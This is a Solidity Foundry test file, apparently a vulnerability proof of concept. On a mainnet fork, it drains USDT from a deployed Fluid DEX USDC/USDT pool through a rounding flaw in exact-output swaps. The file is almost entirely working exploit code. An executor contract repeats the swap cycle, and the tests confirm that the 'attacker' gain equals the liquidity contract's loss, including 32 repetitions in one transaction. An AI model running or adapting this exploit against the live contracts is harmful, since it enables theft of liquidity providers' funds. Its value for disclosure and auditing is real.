// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import { Test } from "forge-std/Test.sol";

interface IERC20BalanceApprove {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexSwapOut {
    function readFromStorage(bytes32 slot) external view returns (uint256);
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external
        payable
        returns (uint256 amountIn);
}

contract ActiveUsdcUsdtRoundTripExecutor {
    address internal immutable pool;
    address internal immutable usdc;
    address internal immutable usdt;

    constructor(address pool_, address usdc_, address usdt_) {
        pool = pool_;
        usdc = usdc_;
        usdt = usdt_;
        _approve(usdc_, pool_);
        _approve(usdt_, pool_);
    }

    function _approve(address token, address spender) private {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20BalanceApprove.approve.selector, spender, type(uint256).max)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function oneCycle(uint256 amountOutUsdt)
        external
        returns (uint256 usdcPaid, uint256 usdtPaidBack, int256 deltaUsdc, int256 deltaUsdt)
    {
        uint256 beforeUsdc = IERC20BalanceApprove(usdc).balanceOf(address(this));
        uint256 beforeUsdt = IERC20BalanceApprove(usdt).balanceOf(address(this));

        usdcPaid = IFluidDexSwapOut(pool).swapOut(true, amountOutUsdt, type(uint256).max, address(this));
        usdtPaidBack = IFluidDexSwapOut(pool).swapOut(false, usdcPaid, type(uint256).max, address(this));

        uint256 afterUsdc = IERC20BalanceApprove(usdc).balanceOf(address(this));
        uint256 afterUsdt = IERC20BalanceApprove(usdt).balanceOf(address(this));
        deltaUsdc = int256(afterUsdc) - int256(beforeUsdc);
        deltaUsdt = int256(afterUsdt) - int256(beforeUsdt);
    }

    function repeatedCycles(uint256 amountOutUsdt, uint256 rounds)
        external
        returns (int256 deltaUsdc, int256 deltaUsdt)
    {
        uint256 beforeUsdc = IERC20BalanceApprove(usdc).balanceOf(address(this));
        uint256 beforeUsdt = IERC20BalanceApprove(usdt).balanceOf(address(this));

        for (uint256 i; i < rounds; ++i) {
            uint256 usdcPaid = IFluidDexSwapOut(pool).swapOut(
                true, amountOutUsdt, type(uint256).max, address(this)
            );
            IFluidDexSwapOut(pool).swapOut(false, usdcPaid, type(uint256).max, address(this));
        }

        uint256 afterUsdc = IERC20BalanceApprove(usdc).balanceOf(address(this));
        uint256 afterUsdt = IERC20BalanceApprove(usdt).balanceOf(address(this));
        deltaUsdc = int256(afterUsdc) - int256(beforeUsdc);
        deltaUsdt = int256(afterUsdt) - int256(beforeUsdt);
    }
}

contract ActiveUsdcUsdtRoundingExtractionTest is Test {
    address internal constant POOL = 0x667701e51B4D1Ca244F17C78F7aB8744B4C99F9B;
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    // 100 USDT out costs 99 USDC, but the reverse 99-USDC exact-output leg
    // is rejected by the protocol's raw minimum amount of 100. At 101 USDT
    // out, the rounded first-leg input is expected to be 100 USDC, making the
    // reverse leg admissible while retaining the one-unit rounding surplus.
    uint256 internal constant AMOUNT_OUT_USDT = 101;

    event SingleCycleProof(
        uint256 blockNumber,
        uint256 feeRaw,
        uint256 usdcPaid,
        uint256 usdtPaidBack,
        int256 attackerDeltaUsdc,
        int256 attackerDeltaUsdt,
        uint256 liquidityLossUsdt,
        uint256 gasUsed
    );
    event RepetitionProof(
        uint256 blockNumber,
        uint256 rounds,
        int256 attackerDeltaUsdc,
        int256 attackerDeltaUsdt,
        uint256 liquidityLossUsdt,
        uint256 gasUsed
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
    }

    function _assertProductionConfiguration() internal view returns (uint256 feeRaw) {
        uint256 packed = IFluidDexSwapOut(POOL).readFromStorage(bytes32(uint256(1)));
        feeRaw = (packed >> 2) & ((1 << 17) - 1);
        assertTrue((packed & 3) != 0, "pool is not initialized/active");
        assertTrue((packed >> 255) == 0, "swaps are paused");
        assertEq(feeRaw, 7, "unexpected deployed fee");
    }

    function _newFundedExecutor() internal returns (ActiveUsdcUsdtRoundTripExecutor executor) {
        executor = new ActiveUsdcUsdtRoundTripExecutor(POOL, USDC, USDT);
        // Only the initial input asset is created in the fork. USDT used on leg two
        // comes exclusively from leg one, so no USDT balance is fabricated.
        deal(USDC, address(executor), 1_000_000);
    }

    function test_deployedSingleCycleExtractsUsdtAndFullyRestoresUsdc() public {
        uint256 feeRaw = _assertProductionConfiguration();
        ActiveUsdcUsdtRoundTripExecutor executor = _newFundedExecutor();

        uint256 liquidityUsdcBefore = IERC20BalanceApprove(USDC).balanceOf(LIQUIDITY);
        uint256 liquidityUsdtBefore = IERC20BalanceApprove(USDT).balanceOf(LIQUIDITY);
        uint256 gasBefore = gasleft();
        (uint256 usdcPaid, uint256 usdtPaidBack, int256 deltaUsdc, int256 deltaUsdt) =
            executor.oneCycle(AMOUNT_OUT_USDT);
        uint256 gasUsed = gasBefore - gasleft();
        uint256 liquidityUsdcAfter = IERC20BalanceApprove(USDC).balanceOf(LIQUIDITY);
        uint256 liquidityUsdtAfter = IERC20BalanceApprove(USDT).balanceOf(LIQUIDITY);

        assertEq(deltaUsdc, 0, "initial asset was not fully restored");
        assertGt(deltaUsdt, 0, "no closed-loop extraction");
        assertEq(liquidityUsdcAfter, liquidityUsdcBefore, "Liquidity retained/lost USDC");
        assertEq(
            liquidityUsdtBefore - liquidityUsdtAfter,
            uint256(deltaUsdt),
            "attacker gain must equal Liquidity USDT loss"
        );

        emit SingleCycleProof(
            block.number,
            feeRaw,
            usdcPaid,
            usdtPaidBack,
            deltaUsdc,
            deltaUsdt,
            liquidityUsdtBefore - liquidityUsdtAfter,
            gasUsed
        );
    }

    function test_deployedCycleIsRepeatableInOneTransaction() public {
        _assertProductionConfiguration();
        ActiveUsdcUsdtRoundTripExecutor executor = _newFundedExecutor();
        uint256 rounds = 32;

        uint256 liquidityUsdcBefore = IERC20BalanceApprove(USDC).balanceOf(LIQUIDITY);
        uint256 liquidityUsdtBefore = IERC20BalanceApprove(USDT).balanceOf(LIQUIDITY);
        uint256 gasBefore = gasleft();
        (int256 deltaUsdc, int256 deltaUsdt) = executor.repeatedCycles(AMOUNT_OUT_USDT, rounds);
        uint256 gasUsed = gasBefore - gasleft();
        uint256 liquidityUsdcAfter = IERC20BalanceApprove(USDC).balanceOf(LIQUIDITY);
        uint256 liquidityUsdtAfter = IERC20BalanceApprove(USDT).balanceOf(LIQUIDITY);

        assertEq(deltaUsdc, 0, "initial asset was not restored after repetition");
        assertGt(deltaUsdt, 0, "repetition produced no aggregate extraction");
        assertEq(liquidityUsdcAfter, liquidityUsdcBefore, "Liquidity USDC changed");
        assertEq(
            liquidityUsdtBefore - liquidityUsdtAfter,
            uint256(deltaUsdt),
            "aggregate gain must equal aggregate Liquidity loss"
        );

        emit RepetitionProof(
            block.number,
            rounds,
            deltaUsdc,
            deltaUsdt,
            liquidityUsdtBefore - liquidityUsdtAfter,
            gasUsed
        );
    }
}
